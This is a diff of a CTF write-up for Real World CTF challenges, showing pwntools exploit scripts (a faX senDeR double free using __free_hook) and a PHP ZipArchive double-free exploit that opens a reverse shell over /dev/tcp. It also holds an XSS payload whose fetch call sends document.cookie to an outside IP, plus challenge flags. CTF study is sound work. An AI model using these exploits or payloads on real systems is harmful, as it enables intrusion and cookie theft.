@@ -26,6 +26,7 @@
 
 ### Slide Puzzle
 
+
 ```python=
 from z3 import *
 
@@ -103,8 +104,10 @@ for i in flag:
   ff+=chr(int(str(s.model()[i])))
 print ff
 
+
 ```
 ### Caidanti
+
 
 ```python=
 from pwn import *
@@ -165,11 +168,13 @@ r.send(pp)
 
 r.interactive()
 
+
 ```
 
 ## Pwn
 
 ### Across the Great Wall
+
 ```python=
 import hashlib
 from Crypto.Cipher import AES
@@ -242,11 +247,13 @@ s.interactive()
 
 
 
+
 ```
 ### faX senDeR
 * delete_msg didn't clean the pointer.
 * add_msg with an invalid size, it won't set the new pinter, old pointer remained.
 * double free
+
 ```python=
 #!/usr/bin/env python
 from pwn import *
@@ -336,10 +343,12 @@ add_msg( 0 , 0x68 , '/bin/sh\0' + p64( 0x4a9678 ) ) # xchg eax, edi ; xchg eax, 
 dle_msg(1) # trgger __free_hook -> stack pivot
 
 y.interactive()
+
 ```
 
 ### anti-antivirus
 * Use rarvmtools to create rar file and upload.
+
 ```c=
 #include <constants.rh>
 #include <crctools.rh>
@@ -394,20 +403,24 @@ _start:
     mov     [r2],r1
     call    $_success
 
+
 ```
 
 ### MoP
 First, we find out the commit version `37a8408e8` according to hint, and get diff info as below.
+
 ```
 $ diff -r php-src/ext/zip/php_zip.c no_realworld_php/ext/zip/php_zip.c
 1383d1382
 <         ze_obj->filename = NULL;
+
 ```
 Obviously, There is a double free vulnerability we can exploit at ZipArchive class. 
 In zend allocator, `_emalloc` does not check any metadata from the freed chunk,
 so we can simply get `arbitray read/write`. 
 
 Leak the libc, overwrite `__free_hook`, and get reverse shell!!
+
 
 ```php=
 <?php
@@ -489,6 +502,7 @@ $zip2->addFromString('bash -c "bash > /dev/tcp/IP/4444 0>&1";', int_to_string($l
 
 ?>
 
+
 ```
 #### open_basedir bypass
 
@@ -505,9 +519,11 @@ The server uses scrapy with headless chromium to crawl the page. We search for s
 
 I leverage somd [DNS-based browser port scanning](https://bookgin.tw/2019/01/05/abusing-dns-browser-based-port-scanning-and-dns-rebinding/) technique to check that the `127.0.0.1:6023` is opened. The following DNS record for example.com is configured:
 
+
 ```
 127.0.0.1 example.com A
 240.240.240.240 example.com A
+
 ```
 
 And I found that the browser it will never send a request to `240.240.240.240`, which indicates that the port is opened. The reason is that chromium will always resolve to 127.0.0.1 first. For more detail you can refer to [my article]((https://bookgin.tw/2019/01/05/abusing-dns-browser-based-port-scanning-and-dns-rebinding/)).
@@ -529,6 +545,7 @@ Okay, so maybe next time I'll try to either search for more information about th
 ### Mission Invisible
 
 This is a XSS challenge:
+
 
 
 ```javascript=
@@ -576,6 +593,7 @@ This is a XSS challenge:
     var tag = getUrlParam("tag");
     setCookie("tag", tag);
     setElement(tag);
+
 ```
 
 1. Bypass getCookie("attr"): `url?tag=attrs=3`
@@ -587,10 +605,12 @@ The key point is the `onfocus` event. It does not come out into my mind magicall
 
 Payload:
 
+
 ```
 http://52.52.236.217:16401/?tag=attrs=id%3Dfoo%2526onfocus%3Djavascript%3Afetch%28%27%2F%2F240.240.240.240%3A1234%3F%27%2Bdocument.cookie%29%2526href%3D%23foo#foo
 
 # rwctf{fR0m1olotH!n9}
+
 ```
 
 #### Failed Attempts
@@ -600,6 +620,7 @@ http://52.52.236.217:16401/?tag=attrs=id%3Dfoo%2526onfocus%3Djavascript%3Afetch%
 
 ## Crypto
 ### bank
+
 
 ```python=
 from pwn import *
@@ -654,4 +675,5 @@ def main():
 main()
 
 # rwctf{P1Ain_SChNorr_n33Ds_m0re_5ecur1ty!}
+
 ```
